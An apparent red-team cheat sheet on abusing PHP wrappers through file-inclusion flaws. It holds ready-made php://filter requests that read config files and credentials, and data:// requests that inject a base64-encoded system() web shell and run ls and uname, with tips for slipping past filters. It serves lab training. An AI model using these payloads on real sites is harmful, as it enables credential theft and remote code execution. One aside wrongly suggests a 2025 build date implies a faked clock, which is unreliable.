---
title: PHP Wrapper
parent: Tools
grand_parent: Red Team
nav_order: 5
---
### PHP Wrapper
# Overview
By using wrappers, it is possible to bypass filters in PHP web applications or execute code by exploiting file inclusion vulnerabilities.

---
# php://filter wrapper
- Displays the contents of a file regardless of whether it is encoded using ROT13, Base64, or other methods.
- Using `php://filter`, you can view the contents of executable files (such as `.php`) without executing them. This allows you to inspect sensitive information contained in PHP files and analyze the logic of web applications.

## Resources
- Required parameters for `php://filter`
- You can specify absolute or relative paths
```bash
curl http://mountaindesserts.com/meteor/index.php?page=php://filter/resource=admin.php
```

Retrieve authentication credentials
```bash
http://192.168.0.104/?page=php://filter/read=convert.base64-encode/resource=config
```
In this example, the contents of the config file are output as Base64-encoded text
## convert.base64-encode
- Can display the output in encoded form
- The decoded data may contain [_MySQL_](https://www.mysql.com/) connection information, including the username and password
- Decode the output Base64 string
```bash
curl http://mountaindesserts.com/meteor/index.php?page=php://filter/convert.base64-encode/resource=admin.php
```

Decode
```bash
echo base64-string | base64 -d
```

---
# data:// wrapper
- Specify the data type and content following “data://”

```bash
curl “http://mountaindesserts.com/meteor/index.php?page=data://text/plain,<?php%20echo%20system(‘ls’);?>”
```

## Bypassing Filtering
- If security mechanisms such as a web application firewall are in place, strings like “system” or PHP code elements may be filtered. In such scenarios, you can consider using the **data://** wrapper on base64-encoded data.
- The data:// wrapper does not work with a default PHP installation. To use it, you must enable the allow_url_include setting.
### Encoding
```bash
echo -n ‘<?php echo system($_GET[“cmd”]);?>’ | base64
```
### Output after encoding
```bash
PD9waHAgZWNobyBzeXN0ZW0oJF9HRVRbImNtZCJdKTs/Pg==
```

### Example: ls command (list files in a directory)
```bash
curl “http://mountaindesserts.com/meteor/index.php?page=data://text/plain;base64,PD9waHAgZWNobyBzeXN0ZW0oJF9HRVRbImNtZCJdKTs/Pg==&cmd=ls”
```
### uname -a (display kernel version) command
```bash
curl “http://mountaindesserts.com/meteor/index.php?page=data://text/plain;base64,PD9waHAgZWNobyBzeXN0ZW0oJF9HRVRbImNtZCJdKTs/Pg==&cmd=uname%20-a” | grep generic
```
#### Breaking down the meaning of the output
```bash
`Linux 7fa5bacf2009 5.4.0-212-generic #232-Ubuntu SMP Sat Mar 15 15:34:35 UTC 2025 x86_64 GNU/Linux`
```
| Field                          | Content                                            |
| --------------- --------------- | --------------------------------------------- |
| `Linux`                        | Kernel name                                         |
| `7fa5bacf2009`                 | Hostname (Similar to a Docker container ID)                      |
| `5.4.0-212-generic`            | Kernel version                                     |
| `#232-Ubuntu`                  | Kernel build number and distribution name                        |
| `SMP`                          | Symmetric Multi-Processing (SMP) support |
| `Sat Mar 15 15:34:35 UTC 2025` | Kernel build date and time                                    |
| `x86_64`                       | Architecture (64-bit)                                |
| `GNU/Linux`                    | OS family (Linux using the GNU toolset)                     |

---

## 🔍 Additional Notes

- `7fa5bacf2009` is a typical **Docker container hostname**. This output likely represents **results from execution within a virtualized environment such as Docker**.
    
- `5.4.0-212-generic` is part of the kernel series commonly used in the Ubuntu 20.04 family.
    
- `#232-Ubuntu` indicates that the kernel was built by Ubuntu itself.
    
- Since the date is set to 2025, this may be running in a **virtual environment with a future date**, or the system clock may have been intentionally set back.
